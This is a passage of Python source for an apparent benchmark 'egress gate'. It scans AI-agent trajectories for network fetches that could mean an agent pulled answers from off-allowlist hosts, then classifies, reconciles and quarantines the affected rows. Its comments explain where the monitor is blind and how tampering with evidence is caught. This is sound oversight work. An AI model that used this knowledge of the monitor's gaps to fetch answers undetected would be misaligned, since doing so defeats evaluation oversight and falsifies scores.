        report["exempt"].append(kept)

    # Native Aider chat is scanned before normalized actions, but every
    # suppression belongs in the same complete EXEMPT roster.  Keeping the
    # first location and summing occurrences matches the normalized event
    # dedup below (SDKs often record one command twice).
    if native is not None:
        for record in native.get("exempt") or ():
            remember_exempt(record)

    action_hosts = {}          # event id / tool_call id -> [host, ...]
    action_category = {}       # ...and the category, for the response's label
    for relative, conversation, data in events:
        action = data.get("action")
        if not isinstance(action, dict):
            continue
        report["n_actions"] += 1
        tool = data.get("tool_name") or action.get("kind") or "?"
        found = []

        for raw in dict.fromkeys(_strings(action, _COMMAND_KEYS)
                                 + _tool_call_commands(data)):
            text = redact(raw, secrets)
            # Parsed commands admit both proven non-fetching positions.  The
            # result is empty unless a URI is syntactically in one of them AND
            # no detector other than the bare-URL catch-all fired.
            exempt = _command_exemptions(text)
            for host, position, snippet, count in _exempted(text, exempt):
                # Recorded per (host, position) across the whole trajectory:
                # the SDK writes each command twice (action and tool_call), and
                # an agent that queries a namespace queries it in every event.
                # One line per namespace is a disclosure; forty is noise a
                # reader stops reading -- so the occurrences are COUNTED into
                # the line rather than each getting one, and the event named is
                # the first one, which is where a reader starts looking.
                record = {"event": relative, "conversation": conversation,
                          "tool": tool, "host": host, "position": position,
                          "n": count, "snippet": snippet,
                          "rules": _rules_for_position(position)}
                remember_exempt(record)
            fired = _detect(text, exempt)
            if not fired:
                continue
            category, cat_start, cat_end = fired[0]
            located = _hosts_in(text, category, exempt)
            if located:
                for host, start, end in located:
                    found.append((category, host, _snippet(text, start, end)))
            else:
                found.append((category, None,
                              _snippet(text, cat_start, cat_end)))

        for raw in _strings(action, _CONTENT_KEYS):
            text = redact(raw, secrets)
            match = _WRITTEN_CODE.search(text)
            if not match:
                continue
            located = _hosts_in(text, "network_code_written")
            if located:
                for host, start, end in located:
                    found.append(("network_code_written", host,
                                  _snippet(text, start, end)))
            else:
                found.append(("network_code_written", None,
                              _snippet(text, match.start(), match.end())))

        if not found:
            continue
        keys = [key for key in (data.get("id"), data.get("tool_call_id"))
                if key]
        hosts = sorted({host for _, host, _ in found if host})
        for key in keys:
            action_hosts[key] = hosts
            action_category[key] = found[0][0]
        for category, host, snippet in found:
            hits.append({"event": relative, "conversation": conversation,
                         "kind": "action", "tool": tool, "host": host,
                         "category": category, "snippet": snippet})

    # Pass 3: what came back.  An observation whose parent action was a hit is
    # the retrieved bytes -- the part that makes "the agent fetched the answer"
    # a statement about the score rather than about intent -- and an
    # observation carrying a transfer marker is an independent finding, for the
    # calls whose command line gave nothing away.
    for relative, conversation, data in events:
        observation = data.get("observation")
        if not isinstance(observation, dict):
            continue
        tool = data.get("tool_name") or observation.get("kind") or "?"
        parent = None
        for key in (data.get("parent_id"), data.get("tool_call_id")):
            if key and key in action_hosts:
                parent = key
                break
        text = redact(_observation_text(observation), secrets)
        if not text:
            continue
        affirmative = affirmative_transfer(text)
        if parent is not None:
            # Hosts are INHERITED from the command, never re-read out of the
            # body.  A GitHub tree listing mentions a hundred github.com URLs
            # that were never fetched; reporting them would turn one violation
            # into a hundred and bury the one that matters.
            marker = re.search(r"https?://|HTTPError|Error", text)
            offset = marker.start() if marker else 0
            snippet = _snippet(text, offset, offset)
            for host in (action_hosts[parent] or [None]):
                hits.append({"event": relative, "conversation": conversation,
                             "kind": "response", "tool": tool, "host": host,
                             "category": action_category.get(parent, "response")
                             + "_response",
                             "snippet": snippet, "of_action": parent,
                             **({"affirmative_transfer": True}
                                if affirmative else {})})
            continue
        for category, pattern in _OBSERVATION_MARKERS:
            match = pattern.search(text)
            if not match:
                continue
            located = _hosts_in(text, category)
            host = located[0][0] if located else None
            hits.append({"event": relative, "conversation": conversation,
                         "kind": "response", "tool": tool, "host": host,
                         "category": category + "_unattributed",
                         "snippet": _snippet(text, match.start(), match.end()),
                         **({"affirmative_transfer": True}
                            if affirmative else {})})
            break

    # Pass 4: the raw sweep.  Everything above read PARSED events; this reads
    # the bytes of what would not parse and of what we never knew how to parse,
    # so that a directory holding somebody else's trajectory format cannot go
    # by as an empty one.  It runs last so its hits sort after the structural
    # findings, which are the stronger evidence.
    raw_hits, raw_errors, raw_exempt = _raw_sweep(
        directory, report["unrecognized"], "unrecognized-file", secrets)
    more_hits, more_errors, more_exempt = _raw_sweep(
        directory, unparsed, "unparsed-event", secrets)
    hits.extend(raw_hits)
    hits.extend(more_hits)
    for record in raw_exempt + more_exempt:
        remember_exempt(record)
    report["errors"].extend(raw_errors)
    report["errors"].extend(more_errors)
    if native is not None:
        # The seam's sweep of the DECLARED native bytes, run by the same
        # `_raw_sweep` under the same SUSPECT cap.  Last, like the sweeps
        # above, and after them: an accounted transcript is weaker evidence
        # than a file nobody could read at all.
        hits.extend(native.get("hits") or ())
        report["errors"].extend(native.get("errors") or ())

    report["hits"] = hits
    report["n_hits"] = len(hits)
    report["hosts"] = sorted({hit["host"] for hit in hits if hit["host"]})
    report["n_exempt"] = sum(record["n"] for record in report["exempt"])
    return report


def classify(report: dict, policy) -> dict:
    """Decide every hit against the policy.  Returns a NEW report.

    The scan and the decision are separate on purpose: a trajectory is scanned
    once and can then be judged against the policy of whichever run file cites
    it, and a reviewer can re-decide an old report without re-reading 12,000
    event files.
    """
    policy = _as_policy(policy)
    out = dict(report)
    hits = []
    counts = {PERMITTED: 0, VIOLATION: 0, SUSPECT: 0}
    n_raw = 0
    for hit in report.get("hits") or []:
        decided = dict(hit)
        decided["verdict"] = policy.verdict_for(hit.get("host"),
                                                hit.get("category") or "")
        if hit.get("kind") == "raw":
            # A raw byte-match is capped at SUSPECT in BOTH directions.  It
            # cannot be promoted to VIOLATION, because bytes do not say whether
            # the command ran; and it cannot be let down to PERMITTED, because
            # a file we could not parse is not a file we can clear.  The row it
            # belongs to is refused as `unassessable` regardless.
            decided["verdict"] = SUSPECT
            n_raw += 1
        counts[decided["verdict"]] += 1
        hits.append(decided)
    out["hits"] = hits
    out["verdicts"] = counts
    out["n_violations"] = counts[VIOLATION]
    out["n_suspects"] = counts[SUSPECT]
    # How many of those suspects came out of the RAW sweep rather than out of
    # a command the agent is recorded as running.  Kept apart because they
    # decide nothing: see `contaminated` below.
    out["n_raw_suspects"] = n_raw
    out["violation_hosts"] = sorted({hit["host"] for hit in hits
                                     if hit["verdict"] == VIOLATION
                                     and hit["host"]})
    # A raw hit is evidence the scan was incomplete, not evidence of retrieval.
    # So it is subtracted here and can never make a row CONTAMINATED -- not
    # under `--strict`, and not when its host is one the policy denies.  It
    # already forces the row `unassessable` and exit 4 by itself; adding an
    # accusation the bytes do not support (a URL in an unparsed config file is
    # not a fetch) is how a gate earns a reputation for crying wolf.
    out["contaminated"] = bool(counts[VIOLATION]) or bool(
        policy.strict_suspect and (counts[SUSPECT] - n_raw))
    return out


# ------------------------------------------------- run file -> trajectory dirs

def item_key(item_id: str) -> str:
    """The trajectory directory name for an item.

    `adapters.make_openhands_adapter` names it `sha1(item_id)[:16]`, and a
    re-run lands on `<key>.r2`, `<key>.r3`, ... rather than colliding.  This
    duplicates that one line instead of importing it, because `adapters` is a
    2,000-line module that constructs seeds and workspaces on import paths the
    gate has no business touching -- and because if the two ever disagree, the
    selftest's `.r2` case is where it shows up.
    """
    return hashlib.sha1(item_id.encode()).hexdigest()[:16]


def _attempt_dirs(parent: str, key: str) -> list:
    """`<parent>/<key>` and its `.rN` retries, in attempt order."""
    found = []
    if not os.path.isdir(parent):
        return found
    base = os.path.join(parent, key)
    if os.path.isdir(base):
        found.append((1, base))
    try:
        names = os.listdir(parent)
    except OSError:
        return found
    for name in names:
        match = re.fullmatch(re.escape(key) + r"\.r(\d+)", name)
        if match and os.path.isdir(os.path.join(parent, name)):
            found.append((int(match.group(1)), os.path.join(parent, name)))
    return [path for _, path in sorted(found)]


def trajectory_dirs(item_id: str, trajectory_root: str,
                    condition: Optional[str] = None,
                    recorded: Optional[str] = None) -> list:
    """Every attempt directory that could hold this row's trajectory.

    Two layouts have to work.  `--trajectories <artifacts>/trajectories` is the
    adapter's own root, under which the attempt lives at `<condition>/<key>`;
    `--trajectories <artifacts>/trajectories/c1.5` is what an operator types
    when they are auditing one arm, and the attempt is then at `<key>`.  Both
    are accepted, and when the row names its condition the search is CONFINED
    to that subdirectory -- the key is a function of the item alone, so the
    same item has a directory under c1.5, c2 and c3, and a C2 run file scanned
    against the shared root would otherwise inherit C1.5's contamination.

    `recorded` is `metadata.trajectory.dir` off the row: the directory the
    scored attempt actually used.  It is included whenever it exists, because
    it is the only evidence that survives if someone re-runs an item and
    changes which `.rN` is which.
    """
    parents = [trajectory_root]
    if condition and os.path.isdir(os.path.join(trajectory_root, condition)):
        parents.append(os.path.join(trajectory_root, condition))
    elif not condition and os.path.isdir(trajectory_root):
        for name in sorted(os.listdir(trajectory_root)):
            if os.path.isdir(os.path.join(trajectory_root, name)):
                parents.append(os.path.join(trajectory_root, name))
    key = item_key(item_id)
    out, seen = [], set()
    for parent in parents:
        for path in _attempt_dirs(parent, key):
            real = os.path.realpath(path)
            if real not in seen:
                seen.add(real)
                out.append(path)
    if recorded and os.path.isdir(recorded):
        for path in _attempt_dirs(os.path.dirname(recorded),
                                  os.path.basename(recorded).split(".r")[0]):
            real = os.path.realpath(path)
            if real not in seen:
                seen.add(real)
                out.append(path)
    return out


def _rows(run_jsonl: str) -> list:
    """(line_number, raw_line, parsed_or_None) for a run file, read-only."""
    out = []
    with open(run_jsonl, "r", encoding="utf-8", errors="replace") as handle:
        for number, line in enumerate(handle, 1):
            if not line.strip():
                continue
            try:
                out.append((number, line, json.loads(line)))
            except ValueError:
                out.append((number, line, None))
    return out


def scan_run(run_jsonl: str, trajectory_root: str, policy,
             secrets: Iterable = (), condition: Optional[str] = None) -> dict:
    """`{item_id: verdict}` for every row in a run file.

    A row is contaminated if ANY of its attempts shows a violation.  Not just
    the scored attempt: a retry exists because the first attempt failed, the
    agent's conversation is not reset by our bookkeeping, and an item whose
    first attempt fetched the answer has had the answer in front of it.

    A row is `unassessable` when the gate cannot honestly claim to have read
    its evidence — see `_reconcile`, which is where the conservation check
    lives.  `no_trajectory` now means what its name says: no attempt directory
    on disk held a single event file.  Under v1 it was cleared by the mere
    EXISTENCE of a directory, which is how a run file full of a format this
    module cannot read exited 0.
    """
    policy = _as_policy(policy)
    trajectory_root = os.path.abspath(trajectory_root)
    verdicts = {}
    cache = {}
    for number, _line, row in _rows(run_jsonl):
        if not isinstance(row, dict):
            continue
        item_id = row.get("item_id")
        if not item_id:
            continue
        summary = ((row.get("metadata") or {}).get("trajectory") or {}) \
            if isinstance(row.get("metadata"), dict) else {}
        summary = summary if isinstance(summary, dict) else {}
        # "The row said something about its trajectory" -- as opposed to a row
        # that carries no metadata at all, which claims nothing and is read by
        # convention alone.  Only an EXPLICIT claim can be contradicted.
        explicit = "present" in summary or "n_events" in summary
        recorded = summary.get("dir")
        row_condition = condition or row.get("condition")
        entry = verdicts.setdefault(item_id, {
            "item_id": item_id, "condition": row_condition, "rows": 0,
            "lines": [], "attempts": [], "n_violations": 0, "n_suspects": 0,
            "n_permitted": 0, "hosts": [], "violation_hosts": [],
            "contaminated": False, "no_trajectory": True,
            "gate_version": EGRESS_GATE_VERSION,
            "recorded": [], "recorded_absent": [],
            "unrecognized": [], "unreadable": [],
            "n_events": 0, "n_raw_suspects": 0, "superset": [],
            "exempt": [],
            "unassessable": True, "unassessable_reasons": []})
        entry["rows"] += 1
        entry["lines"].append(number)
        # What the run row itself claims about its trajectory, kept for the
        # conservation check.  `n_events` is absent on rows written before the
        # adapter recorded it and on rows whose trajectory was never there; an
        # absent counter is reconciled against nothing rather than against 0.
        #
        # `conversations` is the row's INVENTORY, not another counter: which
        # conversation directories the scored attempt had.  A count says how
        # much was there, an inventory says WHAT was there, and only the second
        # can tell a directory that grew from a directory that was replaced.
        if recorded and isinstance(summary.get("n_events"), int):
            listed = summary.get("conversations")
            entry["recorded"].append(
                {"dir": recorded, "real": os.path.realpath(recorded),
                 "n_events": summary["n_events"],
                 "present": summary.get("present"),
                 "conversations": [name for name in listed
                                   if isinstance(name, str)]
                 if isinstance(listed, list) else [],
                 "line": number})
        # ...and the mirror image: the row says there was NOTHING to score.
        # If a conventionally named attempt directory full of events then turns
        # up for this item, the two records disagree about what belongs to it,
        # and `_reconcile` refuses the row rather than adopting the folder.
        if explicit and (summary.get("present") is False
                         or summary.get("n_events") == 0):
            entry["recorded_absent"].append(
                {"line": number,
                 "why": "trajectory.present is false"
                        if summary.get("present") is False
                        else "trajectory.n_events is 0"})
        for directory in trajectory_dirs(item_id, trajectory_root,
                                         row_condition, recorded):
            real = os.path.realpath(directory)
            if any(attempt["real"] == real for attempt in entry["attempts"]):
                continue
            if real not in cache:
                cache[real] = scan_trajectory(directory, secrets)
            decided = classify(cache[real], policy)
            attempt = {
                "dir": directory, "real": real,
                "n_events": decided["n_events"], "n_hits": decided["n_hits"],
                "n_parsed": decided["n_parsed"], "parsed": decided["parsed"],
                "recount": decided["recount"],
                "unrecognized": decided["unrecognized"],
                "verdicts": decided["verdicts"], "hosts": decided["hosts"],
                "n_raw_suspects": decided["n_raw_suspects"],
                "hits": decided["hits"], "errors": decided["errors"]}
            if decided.get("exempt"):
                # Present ONLY where a position rule actually suppressed
                # something, for the same reason `native` is: an attempt that
                # exempted nothing keeps yesterday's keys to the byte, and the
                # key's presence is itself the signal that this row's verdict
                # was reached with a narrowed detector.
                attempt["exempt"] = decided["exempt"]
            row_system = row.get("agent_system") or row.get("adapter")
            if "native" in decided:
                # Present ONLY when the attempt carried a native manifest —
                # or, below, when the row's system OWES one — so an archived
                # row's attempt record keeps yesterday's keys to the byte.
                # Copied before the cross-check below appends to it: the
                # scan is cached per DIRECTORY and shared across rows, and a
                # per-row finding written into the cache would become every
                # row's finding.
                native = dict(decided["native"])
                claimed = native.get("agent_system")
                if row_system and claimed and claimed != row_system:
                    # Two records disagreeing about WHOSE evidence this is.
                    # Adopting either would let a directory that happens to
                    # hash-match speak for a system that never wrote it.
                    native["problems"] = list(native.get("problems") or ()) + [
                        f"the native manifest claims agent system {claimed!r} "
                        f"and the run row claims {row_system!r} -- two "
                        "records disagree about whose evidence this is"]
                attempt["native"] = native
            else:
                # No manifest at all.  For an archived system that never
                # promised one this is the deliberate quiet path; for a
                # system whose AdapterSpec declares the contract it is a
                # missing recorder, and the row fails assessment loudly.
                # The driver is CORRECT to survive a failed `_preserve_
                # native` — bookkeeping after a finished run must never be
                # able to discard the run — which is exactly why the loss
                # has to surface HERE: the surviving row would otherwise
                # take the archived path and carry rev 1's circular
                # assurance through a strict gate.
                required = _native_contract(row_system)
                if required is not None:
                    schema, qualified = required
                    attempt["native"] = {
                        "agent_system": None, "counts": {}, "declared": [],
                        "termination": None, "missing": True,
                        "problems": [
                            f"the run row claims {row_system!r}, and "
                            f"{qualified}'s contract requires every attempt "
                            f"to carry a native manifest ({schema}); "
                            f"{_NATIVE_MANIFEST} is not there, so the "
                            "framework's own record of this run is missing "
                            "and the driver's normalized stream cannot be "
                            "reconciled against anything"],
                        "hits": [], "errors": []}
            entry["attempts"].append(attempt)
            if decided["n_events"] > 0:
                # A DIRECTORY is not a trajectory.  Only event files are.
                entry["no_trajectory"] = False
    for entry in verdicts.values():
        hosts, violation_hosts = set(), set()
        for attempt in entry["attempts"]:
            entry["n_violations"] += attempt["verdicts"][VIOLATION]
            entry["n_suspects"] += attempt["verdicts"][SUSPECT]
            entry["n_raw_suspects"] += attempt["n_raw_suspects"]
            entry["n_permitted"] += attempt["verdicts"][PERMITTED]
            entry["n_events"] += attempt["n_events"]
            hosts.update(attempt["hosts"])
            violation_hosts.update(hit["host"] for hit in attempt["hits"]
                                   if hit["verdict"] == VIOLATION
                                   and hit["host"])
            for error in attempt["errors"]:
                entry["unreadable"].append(dict(error, dir=attempt["dir"]))
            for name in attempt["unrecognized"]:
                entry["unrecognized"].append(
                    os.path.join(attempt["dir"], name))
            for record in attempt.get("exempt") or ():
                entry["exempt"].append(dict(record, dir=attempt["dir"]))
        entry["hosts"] = sorted(hosts)
        entry["violation_hosts"] = sorted(violation_hosts)
        # Raw suspects are subtracted for the reason `classify` gives: a raw
        # hit is evidence the scan was incomplete, not evidence of retrieval.
        entry["contaminated"] = bool(entry["n_violations"]) or bool(
            policy.strict_suspect
            and (entry["n_suspects"] - entry["n_raw_suspects"]))
        _reconcile(entry)
    return verdicts


def _reconcile(entry: dict) -> None:
    """The conservation check.  Decides `unassessable` for one row, in place.

    Three counters have to agree before the gate will say it read this row:
    what the run row recorded at generation time, what a recount by the
    adapter's rule finds on disk now, and what this module walked and parsed.

    Every disagreement is written out in words, because "unassessable" with no
    reason attached is the kind of output people learn to skip.  The reasons
    are, in the order they are checked:

    * no attempt directory held an event file at all;
    * a directory is there and holds nothing we recognise as an event;
    * an event file would not parse;
    * a file under the attempt is in a format we do not read;
    * the two on-disk counts disagree — a file is sitting in an `events/`
      directory under a name the scanner does not pick up;
    * the row cites a directory the gate never read, or one that has FEWER
      events than the row recorded;
    * a conversation the row RECORDED holds no event file any more, or the
      events surviving under the recorded conversations add up to less than
      the row recorded.  This is what makes "more on disk than the row
      recorded" a superset rather than a substitution: without it, deleting
      the conversation that held the violation and dropping a larger innocuous
      one in its place turns a REFUSED into a CLEAN, with the destroyed
      evidence printed as a NOTE.  The test is over EVENTS and not over
      directory names, because `isdir` is passed by a conversation someone
      emptied in place.  Only once every recorded conversation still holds
      events, and they still add up, is the surplus written to `superset` and
      treated as not-a-failure: the scored events are then a subset of what
      was scanned, and reading more can only find more.  See the module
      docstring for the c3 measurement behind the directional rule, for the
      repro behind this, and for what a count-and-histogram record still
      cannot see;
    * the row recorded `n_events` but named NO conversations, so there is no
      inventory to check the disk against and its surplus cannot be read as a
      superset at all;
    * the row's own metadata says there was NO trajectory (`present: false`, or
      `n_events: 0`) and a conventionally named attempt directory full of
      events turned up anyway.  A folder the adapter says it never wrote is the
      same hole seen from the other side, and adopting it would let any
      directory that happens to hash-match speak for the row.  Rows with no
      metadata at all make no such claim and are read by convention as before,
      and the mismatch is not raised when another row of the SAME item
      recorded `present: true` against a directory the gate read -- a crashed
      first attempt does not impeach the retry that worked.
    """
    reasons = []
    if entry["no_trajectory"]:
        reasons.append("no attempt directory on disk holds an event file")
    for attempt in entry["attempts"]:
        where = attempt["dir"]
        if attempt["n_events"] == 0:
            reasons.append(f"{where}: present but holds no event file")
        if attempt["errors"]:
            reasons.append(f"{where}: {len(attempt['errors'])} event file(s) "
                           "could not be read")
        if attempt["unrecognized"]:
            reasons.append(
                f"{where}: {len(attempt['unrecognized'])} file(s) in a format "
                "this gate does not read: "
                + ", ".join(attempt["unrecognized"][:3]))
        if attempt["recount"] != attempt["n_events"]:
            reasons.append(
                f"{where}: the adapter's rule counts {attempt['recount']} "
                f"events, this scan walked {attempt['n_events']}")
        # The native-manifest seam's findings, already written out in words
        # by `agents.scanners`.  Each is a way the two recorders of one run
        # -- the framework's own artifacts and the driver's normalized
        # stream -- failed to agree, and a row whose recorders disagree is a
        # row nobody may score.
        for problem in (attempt.get("native") or {}).get("problems") or ():
            reasons.append(f"{where}: {problem}")
    by_real = {attempt["real"]: attempt for attempt in entry["attempts"]}
    for record in entry["recorded"]:
        attempt = by_real.get(record["real"])
        if attempt is None:
            reasons.append(
                f"row line {record['line']} was scored against "
                f"{record['dir']} ({record['n_events']} events) and the gate "
                "never read that directory")
            continue
        # The inventory check, BEFORE the count comparison decides anything.
        # It is made of EVENTS, not of directory names: `isdir` on the
        # conversation NAME is passed by a conversation whose events were
        # deleted under it, which is one token of difference from the repro
        # the inventory check was written for (see the module docstring).
        # So what counts is how much of the scored evidence SURVIVES under the
        # conversations the row was scored on -- never the attempt total,
        # which anything dropped alongside them inflates.
        conversations = record["conversations"]
        surviving = {conv: _conversation_events(attempt["dir"], conv)
                     for conv in conversations}
        gone = [conv for conv in conversations if not surviving[conv]]
        n_surviving = sum(surviving.values())
        superset_ok = False
        if not conversations:
            # No inventory at all: a surplus here cannot be shown to be a
            # superset of anything, so it is not read as one.  Fail closed
            # rather than degrading silently to the count-only rule.
            if record["n_events"] > 0:
                reasons.append(
                    f"{record['dir']}: the run row recorded "
                    f"{record['n_events']} events but does not name which "
                    "conversations were scored, so what is on disk now cannot "
                    "be checked against what was read then -- a surplus here "
                    "cannot be verified as a superset")
            if attempt["n_events"] < record["n_events"]:
                reasons.append(
                    f"{record['dir']}: the run row recorded "
                    f"{record['n_events']} events, {attempt['n_events']} are "
                    "on disk -- the scored evidence is gone")
        else:
            if gone:
                reasons.append(
                    f"{record['dir']}: the run row was scored on "
                    "conversation(s) " + ", ".join(gone[:3])
                    + (f" (+{len(gone) - 3} more)" if len(gone) > 3 else "")
                    + ", and they hold no event file under that attempt any "
                    "more -- what this scan read is a different set of events, "
                    "not a superset of what was scored")
            if n_surviving < record["n_events"]:
                named = gone + [conv for conv in conversations
                                if conv not in gone]
                reasons.append(
                    f"{record['dir']}: the run row was scored on "
                    f"{record['n_events']} events under conversation(s) "
                    + ", ".join(named[:3])
                    + (f" (+{len(named) - 3} more)" if len(named) > 3 else "")
                    + f", and {n_surviving} event file(s) are still there -- "
                    "the scored evidence is gone")
            else:
                superset_ok = not gone
        if superset_ok and attempt["n_events"] > record["n_events"]:
            entry["superset"].append(
                {"dir": record["dir"], "recorded": record["n_events"],
                 "on_disk": attempt["n_events"]})
    # A row that recorded no trajectory, holding one.  `recorded_absent` is
    # per-ROW but `unassessable` is per-ITEM, so one crashed attempt that
    # recorded `present: false` would otherwise refuse the item even when a
    # LATER row of the same item recorded a real trajectory against a
    # directory this gate went on to read.  52 of 100 c1.5 items and 47 of
    # 100 c2 items have more than one row; refusing all of them because the
    # first attempt died is a false accusation, and the mismatch it is
    # guarding against -- "nobody recorded this folder" -- is not true of an
    # item some row DID record.
    with_events = [attempt for attempt in entry["attempts"]
                   if attempt["n_events"] > 0]
    # An affirming row has to make the OPPOSITE claim to be worth anything:
    # `present: true` with events of its own, against a directory that is
    # actually here.  A row recording `present: true, n_events: 0` is making
    # the absent claim itself and cannot answer for it.
    affirmed = [record for record in entry["recorded"]
                if record["present"] is True and record["n_events"] > 0
                and by_real.get(record["real"], {}).get("n_events", 0) > 0]
    if with_events and not affirmed:
        for record in entry["recorded_absent"]:
            reasons.append(
                f"row line {record['line']} recorded {record['why']} -- the "
                "adapter says it never wrote a trajectory for this item -- and "
                f"{len(with_events)} attempt directory(ies) hold event files: "
                + ", ".join(attempt["dir"] for attempt in with_events[:2]))
    entry["unassessable_reasons"] = reasons
    entry["unassessable"] = bool(reasons)


# ---------------------------------------------------------------------- gate

#: Printed by `gate` on every outcome, pass included.  A gate that says
#: "CLEAN" and stops has quietly promoted detection to prevention in the mind
#: of everyone who reads it.
NOT_PREVENTION = (
    "This gate is DETECTION, not prevention: it reads trajectories after the "
    "run and cannot stop a fetch. Prevention is SPEC_C3_PARALLEL 3.12's "
    "unenforced `egress_allowlist` -- a network namespace with an allowlisting "
    "proxy for the model endpoint, or the host firewall rule `confine.certify` "
    "prints. A clean result here means nothing was RECORDED, which is a floor "
    "on contamination and not a ceiling.")

PROXY_PREVENTION = (
    "The coordinator proxy prevented every journaled off-allowlist CONNECT: "
    "each received an empty-body 403 before any upstream connection. The "
    "trajectory detector remains the independent check for affirmative "
    "off-allowlist retrieval evidence.")


def _write_lines(path: str, lines: Iterable) -> None:
    tmp = path + ".partial"
    with open(tmp, "w", encoding="utf-8") as handle:
        for line in lines:
            handle.write(line if line.endswith("\n") else line + "\n")
    os.replace(tmp, path)


def quarantine(run_jsonl: str, verdicts: dict, out_path: str) -> dict:
    """Split a run file in two.  Nothing is deleted and nothing is edited.

    `out_path` gets the rows that survive, VERBATIM -- the original line text,
    not a re-serialisation, so a byte-compare against the input shows exactly
    which lines left and nothing else.  `<out_path>.quarantined.jsonl` gets the
    contaminated rows with the evidence attached, so the arm can be re-run,
    re-scored or defended without anyone having to reconstruct what was found.
    """
    run_jsonl = os.path.abspath(run_jsonl)
    out_path = os.path.abspath(out_path)
    if out_path == run_jsonl:
        raise ValueError("REFUSED: --quarantine would overwrite the run file "
                         "it is reading. The input is evidence.")
    side_path = out_path + ".quarantined.jsonl"
    for path in (out_path, side_path):
        if os.path.exists(path):
            raise ValueError(f"REFUSED: {path} exists. Remove it deliberately; "
                             "a gate that overwrites its own previous output "
                             "loses the run it was arguing about.")
    kept, removed = [], []
    for number, line, row in _rows(run_jsonl):
        item_id = row.get("item_id") if isinstance(row, dict) else None
        entry = verdicts.get(item_id) if item_id else None
        if entry and entry["contaminated"]:
            removed.append(json.dumps(
                {"line": number, "row": row,
                 "egress": {k: v for k, v in entry.items() if k != "lines"}},
                sort_keys=True))
        else:
            kept.append(line.rstrip("\n"))
    _write_lines(out_path, kept)
    _write_lines(side_path, removed)
    return {"out": out_path, "quarantined": side_path,
            "kept": len(kept), "removed": len(removed)}


def gate(run_jsonl: str, trajectory_root: str, policy,
         quarantine_out: Optional[str] = None, secrets: Iterable = (),
         condition: Optional[str] = None, out=None,
         max_snippets: int = 6, allow_unassessed: bool = False, *,
         precomputed: Optional[dict] = None,
         proxy_attempts: Optional[Mapping[str, list]] = None) -> int:
    """The release gate.  Non-zero means the run file may not be published.

        0  every row assessed, no violation
        1  at least one row is contaminated -- item ids, hosts and snippets
           are printed above this
        2  the run file could not be read
        3  NOTHING could be assessed: no row had a trajectory directory on
           disk at all, so a zero here would be a pass nobody earned.  This is
           the same refusal `confine.certify([])` makes, for the same reason.
        4  at least one row is UNASSESSABLE: its trajectory is present but
           empty, will not parse, is in a format this gate does not read, or
           its event counters do not reconcile.  New in gate v2, and the
           DEFAULT: v1 printed such rows and exited 0, which turned "we could
           not look" into "we looked and it was fine".  `allow_unassessed`
           restores the old behaviour for ad-hoc probes, and says so in the
           output so nobody quotes the result as a release gate result.

    When a run file is both contaminated and unassessable, 1 wins.  Both are
    refusals; the positive finding is the one a reader has to act on first,
    and the unassessable count is printed above either way.
    """
    out = out or sys.stdout
    policy = _as_policy(policy)

    def say(line=""):
        print(line, file=out)

    if precomputed is None:
        try:
            verdicts = scan_run(run_jsonl, trajectory_root, policy, secrets,
                                condition)
        except OSError as exc:
            say(f"REFUSED: cannot read {run_jsonl}: {exc}")
            return 2
    else:
        verdicts = precomputed

    assessed = [entry for entry in verdicts.values()
                if not entry["unassessable"]]
    unassessable = sorted((entry for entry in verdicts.values()
                           if entry["unassessable"]),
                          key=lambda entry: entry["item_id"])
    unassessed = [entry for entry in verdicts.values()
                  if entry["no_trajectory"]]
    # Exit 3 keeps its v1 meaning EXACTLY: not one row had an attempt
    # directory on disk.  It is checked before 4 so the pinned refusal for an
    # entirely trajectory-less run file does not silently become a 4.
    with_dirs = [entry for entry in verdicts.values() if entry["attempts"]]
    superset = sorted((entry for entry in verdicts.values()
                       if entry["superset"] and not entry["unassessable"]),
                      key=lambda entry: entry["item_id"])
    contaminated = sorted((entry for entry in verdicts.values()
                           if entry["contaminated"]),
                          key=lambda entry: entry["item_id"])
    # Raw suspects are excluded here, not hidden: they are printed under
    # UNASSESSABLE, where they belong.  This section says the agent "made a
    # network call", which is a statement about a recorded COMMAND; a byte
    # sitting in a file we could not parse does not support it.
    suspects = sorted((entry for entry in verdicts.values()
                       if entry["n_suspects"] - entry["n_raw_suspects"]
                       and not entry["contaminated"]),
                      key=lambda entry: entry["item_id"])
    n_attempts = sum(len(entry["attempts"]) for entry in verdicts.values())
    n_events = sum(attempt["n_events"] for entry in verdicts.values()
                   for attempt in entry["attempts"])

    say(f"egress gate: {os.path.abspath(run_jsonl)}")
    say(f"  trajectories : {os.path.abspath(trajectory_root)}")
    say(f"  allowed hosts: {', '.join(sorted(policy.allow)) or '<none>'}"
        + ("  (+strict: suspects fail)" if policy.strict_suspect else ""))
    say(f"  rows         : {len(verdicts)} items, {len(assessed)} assessed, "
        f"{len(unassessable)} unassessable ({len(unassessed)} of those have "
        f"no trajectory at all), {n_attempts} attempt dirs, {n_events} events")
    say(f"  gate version : {EGRESS_GATE_VERSION}"
        + ("  (--allow-unassessed: unassessable rows do NOT fail this run)"
           if allow_unassessed else ""))
    if proxy_attempts is not None:
        attempts = [attempt for item in sorted(proxy_attempts)
                    for attempt in proxy_attempts[item]]
        affected = sum(bool(proxy_attempts[item]) for item in proxy_attempts)
        say(f"  proxy blocks : {len(attempts)} rejected CONNECT attempt(s) "
            f"across {affected} item(s)")
        targets = {}
        for attempt in attempts:
            target = (attempt["host"], attempt["port"])
            targets[target] = targets.get(target, 0) + 1
        for (host, port), count in sorted(targets.items()):
            say(f"    {host}:{port} x{count}")
    # Printed ONLY when there are any, which is what keeps every archived
    # gate output byte-identical: no attempt written before `r2t.confined.terminate`
    # existed can declare a termination.  It is printed at all because a
    # reader who is about to quote "100 rows, 0 violations, CLEAN" needs to
    # know how many of those rows stop mid-turn -- an assessable partial run
    # is still a partial run, and this line is the only place that says so.
    terminated = sorted(
        entry["item_id"] for entry in verdicts.values()
        if any((attempt.get("native") or {}).get("termination")
               for attempt in entry["attempts"]))
    if terminated:
        say(f"  terminated   : {len(terminated)} item(s) hit the wall-clock "
            "envelope; their evidence is what the driver preserved before "
            "the kill, and their accounting is a LOWER BOUND")
    say()

    if suspects:
        say(f"SUSPECT -- {len(suspects)} item(s) made a network call whose "
            "host the trajectory does not record.")
        say("  These are reported, never permitted. --strict fails on them.")
        for entry in suspects:
            shown = 0
            for attempt in entry["attempts"]:
                for hit in attempt["hits"]:
                    if (hit["verdict"] != SUSPECT or hit["kind"] == "raw"
                            or shown >= 2):
                        continue
                    shown += 1
                    say(f"  {entry['item_id']}  [{hit['category']}] "
                        f"{hit['snippet']}")
        say()

    if contaminated:
